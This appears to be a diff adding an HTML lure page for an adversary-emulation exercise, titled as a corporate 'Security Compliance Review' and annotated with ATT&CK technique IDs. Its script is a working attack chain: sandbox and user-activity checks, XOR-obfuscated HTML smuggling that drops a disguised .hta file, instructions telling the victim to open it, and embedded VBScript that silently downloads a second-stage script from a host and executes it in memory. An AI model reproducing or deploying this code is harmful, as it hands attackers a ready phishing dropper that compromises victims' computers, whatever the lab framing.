@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Q1 2026 Security Compliance Review - TestLab Corp</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+            padding: 40px;
+            max-width: 580px;
+            width: 90%;
+            text-align: center;
+        }
+        .logo {
+            width: 72px; height: 72px;
+            margin: 0 auto 20px;
+            background: #0f3460;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        h1 { color: #1a1a2e; margin-bottom: 8px; font-size: 22px; }
+        .sub { color: #666; font-size: 14px; margin-bottom: 24px; }
+        .status { margin: 20px 0; font-size: 15px; color: #555; }
+        .spinner {
+            border: 3px solid #eee;
+            border-top: 3px solid #0f3460;
+            border-radius: 50%;
+            width: 44px; height: 44px;
+            animation: spin 0.9s linear infinite;
+            margin: 16px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .success {
+            background: #d4edda; border: 1px solid #c3e6cb;
+            color: #155724; padding: 14px; border-radius: 6px; margin-top: 18px;
+        }
+        .instruction {
+            background: #e8f4fd; border: 1px solid #bee5eb;
+            padding: 14px; border-radius: 6px; margin-top: 12px; text-align: left;
+        }
+        .instruction strong { color: #0c5460; }
+        .instruction ol { margin-left: 18px; margin-top: 8px; }
+        .instruction li { margin-bottom: 5px; font-size: 14px; color: #444; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">TC</div>
+        <h1>Security Compliance Review</h1>
+        <p class="sub">Q1 2026 - Confidential</p>
+        <div class="status" id="status">
+            <div class="spinner"></div>
+            <p>Verifying access credentials...</p>
+        </div>
+    </div>
+
+    <script>
+        // T1497.001 - Sandbox Evasion: System Checks
+        function detectSandbox() {
+            if (screen.width < 1000 || screen.height < 700) return true;
+            if (navigator.plugins.length === 0) return true;
+            var offset = new Date().getTimezoneOffset();
+            if (offset === 0) return true;
+            return false;
+        }
+
+        // T1480.001 - Environmental Keying
+        if (window.location.hostname !== 'upload.testlab.local') {
+            window.location = 'https://www.microsoft.com';
+        }
+
+        if (detectSandbox()) {
+            document.getElementById('status').innerHTML =
+                '<p style="color:#721c24;">Authentication failed. Contact IT support.</p>';
+        } else {
+            // T1497.002 - User Activity Based Checks
+            var interactions = 0;
+            document.addEventListener('mousemove', function() { interactions++; });
+            document.addEventListener('click',     function() { interactions += 3; });
+
+            // T1678 - Delay Execution
+            setTimeout(function() {
+                if (interactions > 3) {
+                    executeSmuggling();
+                } else {
+                    document.getElementById('status').innerHTML =
+                        '<p style="color:#721c24;">Session expired. Please refresh.</p>';
+                }
+            }, 7000);
+        }
+
+        function executeSmuggling() {
+            // T1027.013 - XOR encode at build time, decode at runtime (T1140)
+            var encoded = xorEncode(getHTAPayload(), 'testlab2026sec');
+            var htaContent = xorDecode(encoded, 'testlab2026sec');
+
+            if (htaContent.indexOf('Sub Window_OnLoad') === -1) {
+                console.error('Decode error');
+                return;
+            }
+
+            // T1027.006 - HTML Smuggling via Blob
+            var blob = new Blob([htaContent], { type: 'application/hta' });
+            var url  = URL.createObjectURL(blob);
+
+            // T1036.008 - Masquerade filename
+            var a = document.createElement('a');
+            a.href = url;
+            a.download = 'ComplianceReport_Q1_2026.hta';
+            a.click();
+
+            document.getElementById('status').innerHTML = `
+                <div class="success">
+                    <h3>&#10003; Document Ready</h3>
+                    <p>File: <strong>ComplianceReport_Q1_2026.hta</strong></p>
+                </div>
+                <div class="instruction">
+                    <strong>To view the report:</strong>
+                    <ol>
+                        <li>Open your <strong>Downloads</strong> folder</li>
+                        <li>Double-click <strong>ComplianceReport_Q1_2026.hta</strong></li>
+                        <li>Click <strong>Open</strong> if prompted</li>
+                    </ol>
+                </div>`;
+
+            setTimeout(function() { URL.revokeObjectURL(url); }, 1000);
+        }
+
+        function xorEncode(str, key) {
+            var out = '';
+            for (var i = 0; i < str.length; i++) {
+                out += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+            }
+            return out;
+        }
+        function xorDecode(str, key) { return xorEncode(str, key); }
+
+        // ---------------------------------------------------------------------------
+        // HTA payload - VBS in-memory staging (no PowerShell, no child process)
+        //
+        // Techniques:
+        //   T1218.005  - Signed Binary Proxy Execution: Mshta
+        //   T1059.005  - Command and Scripting Interpreter: Visual Basic
+        //   T1071.001  - Application Layer Protocol: Web Protocols (download stage2)
+        //   T1140      - Deobfuscate/Decode Files or Information
+        //   T1027.010  - Obfuscated Files or Information: Command Obfuscation
+        //   T1564.003  - Hide Artifacts: Hidden Window
+        // ---------------------------------------------------------------------------
+        function getHTAPayload() {
+            return `<html>
+<head>
+<title>Compliance Viewer</title>
+<HTA:APPLICATION
+    ID="ComplianceViewer"
+    APPLICATIONNAME="Compliance Report Viewer"
+    WINDOWSTATE="minimize"
+    SHOWINTASKBAR="no"
+    NAVIGABLE="no"
+    SCROLL="no"
+/>
+<script language="VBScript">
+Sub Window_OnLoad
+
+    ' T1027.010 - String concatenation obfuscation
+    Dim sObj1 : sObj1 = "MSXML" & "2.XML" & "HTTP"
+    Dim sURL  : sURL  = "http://" & "upload.testlab.local" & "/uploads/" & "stage2.vbs"
+
+    ' T1071.001 - Download VBS stage2 in-memory via HTTP
+    Dim xhr : Set xhr = CreateObject(sObj1)
+    xhr.Open "GET", sURL, False
+    xhr.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    xhr.Send
+
+    ' T1059.005 - Execute VBScript directly inside mshta.exe process
+    ' No child process spawned - stage2 runs in the same process context
+    If xhr.Status = 200 Then
+        ' T1140 - Decode and execute at runtime
+        Dim sCode : sCode = xhr.responseText
+        Execute sCode
+    End If
+
+    Set xhr = Nothing
+
+    ' T1564.003 - Close window silently after staging
+    window.setTimeout "self.close", 2000, "VBScript"
+End Sub
+<\/script>
+</head>
+<body style="background:#fff; font-family:Arial; text-align:center; padding:40px;">
+    <p style="color:#888;">Loading compliance data, please wait...</p>
+</body>
+</html>`;
+        }
+    </script>
+</body>
+</html>
